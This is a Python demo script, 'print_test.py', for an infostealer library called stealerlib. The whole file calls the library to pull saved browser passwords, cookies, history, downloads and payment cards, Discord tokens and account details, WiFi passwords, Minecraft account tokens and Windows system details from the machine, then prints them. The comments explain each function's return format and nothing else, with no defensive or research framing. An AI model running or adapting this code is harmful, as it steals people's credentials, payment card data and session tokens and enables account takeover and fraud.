#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: print_test.py
"""

from stealerlib.wifi import WiFi
from stealerlib.system import System
from stealerlib.browser import Browser

from stealerlib.apps.discord import Discord
from stealerlib.apps.minecraft import Minecraft

            # default on commands is True (browser.get_passwords())
conv = False
            # if True, functions will return a list of values
            # as opposed to when False, where the functions will return
            # an interactive StealerLib object

            # Example on how to iterate through an object vs. list of values

            # for site in history:
            #     url = site[0]       # if conv=False
            #     url = site.site_url # if conv=True

            # for login in passwords:
            #     password = login[3]       # if conv=False
            #     password = login.password # if conv=True

            # etc...

if __name__ == '__main__':
    system  = System()
    browser = Browser()
    network = WiFi()
    discord = Discord()
    minecraft = Minecraft()

    passwords = browser.get_passwords(conv=conv)
    print('Browser Passwords:', passwords, '\n') # conv=True ->  [(url, username, password), ...]
                                                # conv=False -> [BrowserTypes.Login, ...]

    cookies = browser.get_cookies(conv=conv)
    print('Browser Cookies:', cookies, '\n') # conv=True ->  [(host, expires?, expire_date, path, name, value), ...]
                                             # conv=False -> [BrowserTypes.Cookie, ...]

    history = browser.get_history(conv=conv)
    print('Browser History:', history, '\n') # conv=True ->  [(site_url, title, timestamp), ...]
                                             # conv=False -> [BrowserTypes.Site, ...]

    downloads = browser.get_downloads(conv=conv)
    print('Browser Downloads:', downloads, '\n') # conv=True ->  [(tab_url, local_path), ...]
                                                 # conv=False -> [BrowserTypes.Download, ...]

    cards = browser.get_cards(conv=conv)
    print('Browser Cards:', cards, '\n') # conv=True ->  [(name, month, year, number, date_modified), ...]
                                         # conv=False -> [BrowserTypes.Card, ...]

    discord.get_tokens(conv=conv)
    print('Discord Tokens:', discord.tokens, '\n') # conv=True ->  [token1, token2, ...]
                                                   # conv=False -> [DiscordTypes.Token, ...]

    discord.get_token_information(discord.tokens, conv=conv)
    print('Discord Accounts:', discord.accounts, '\n') # conv=True ->  [(id, token, username, discriminator, email, phone), ...]
                                                       # conv=False -> [DiscordTypes.Token, ...]

    network.get_wifi_passwords(conv=conv)
    print('WiFi Credentials:', network.credentials, '\n') # conv=True ->  [(ssid, password), ...]
                                                          # conv=False -> [WiFiTypes.SSID, ...]

    system.get_processes(conv=conv)
    print('System Processes:', system.processes, '\n') # conv=True ->  [(pid, name, status, parent_process, child_processes), ...]
                                                       # conv=False -> [SystemTypes.Process, ...]

    system.get_partitions(conv=conv)
    print('System Partitions:', system.partitions, '\n') # conv=True ->  [(pid, name, status, parent_process, child_processes), ...]
                                                         # conv=False -> [SystemTypes.Partition, ...]

    minecraft.get_accounts(conv=conv)
    print('Minecraft Accounts:', minecraft.accounts, '\n') # conv=True ->  [(email, username, uuid, token), ...]
                                                           # conv=False -> [MinecraftTypes.Account, ...]
    
    # windows specific system information grabber
    print(system.comp_info,
          system.os_info,
          system.proc_info,
          system.gpu_info)